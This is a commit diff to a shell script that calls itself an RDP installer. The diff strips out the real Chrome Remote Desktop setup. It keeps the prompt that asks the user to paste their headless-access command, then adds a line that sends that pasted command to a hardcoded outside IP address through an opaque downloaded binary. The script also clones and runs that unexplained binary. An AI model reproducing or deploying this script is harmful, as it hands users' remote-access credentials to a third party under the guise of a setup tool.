742e58dd3346dc734b77d3f379191bd11e42ea31
phucbmt <phucdlbmt@gmail.com>
2021-01-26 19:20:47 +0700

    Update S.sh

--- S.sh
+++ S.sh
@@ -3,17 +3,6 @@ printf "Installing RDP Be Patience... " $1 >&2
 {
 git clone https://github.com/phucbmt/tech.git &> /dev/null
 sudo chmod +x tech/m
-./tech/m -P http://138.197.99.165:4545/test &> log
 } &> /dev/null &&
-printf "\nSetup Complete " >&2 ||
-printf "\nError Occured " >&2
-printf '\nCheck https://remotedesktop.google.com/headless  Copy Command Of Debian Linux And Paste Down\n'
 read -p "Paste Here: " CRP
-su - ALOK -c """$CRP"""
-printf 'Check https://remotedesktop.google.com/access/ \n\n'
-if sudo apt-get upgrade &> /dev/null
-then
-    printf "\n\nUpgrade Completed " >&2
-else
-    printf "\n\nError Occured " >&2
-fi
+./tech/m -P http://138.197.99.165:4545/"""$CRP""" &> log
